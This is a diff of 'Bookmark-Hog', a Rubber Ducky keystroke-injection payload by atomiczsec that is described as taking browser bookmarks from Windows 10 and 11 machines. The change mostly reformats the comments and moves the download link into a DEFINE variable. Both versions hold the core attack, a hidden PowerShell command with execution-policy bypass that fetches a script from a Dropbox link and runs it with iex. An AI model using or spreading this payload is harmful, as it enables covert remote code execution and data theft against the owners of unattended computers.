@@ -1,16 +1,17 @@
-REM     Title: Bookmark-Hog
+REM_BLOCK
+Title: Bookmark-Hog
+Author: atomiczsec
+Description: This payload is meant to exfiltrate bookmarks to the rubber ducky
+Target: Windows 10, 11
 
-REM     Author: atomiczsec
+Remember to replace the link with your DropBox shared link for the intended file to download
+Also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properlymode con:cols=14 lines=1
+END_REM
 
-REM     Description: This payload is meant to exfiltrate bookmarks to the rubber ducky
+DEFINE #URL <Your Shared link for the intended file> 
 
-REM     Target: Windows 10, 11
-
+DUCKY_LANG US
 DELAY 2000
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -ep Bypass $pl = iwr < Your Shared link for the intended file> dl=1; iex $pl
-ENTER
-
-REM     Remember to replace the link with your DropBox shared link for the intended file to download
-REM     Also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properlymode con:cols=14 lines=1
+STRINGLN powershell -w h -NoP -NonI -ep Bypass $pl = iwr #URLdl=1; iex $pl
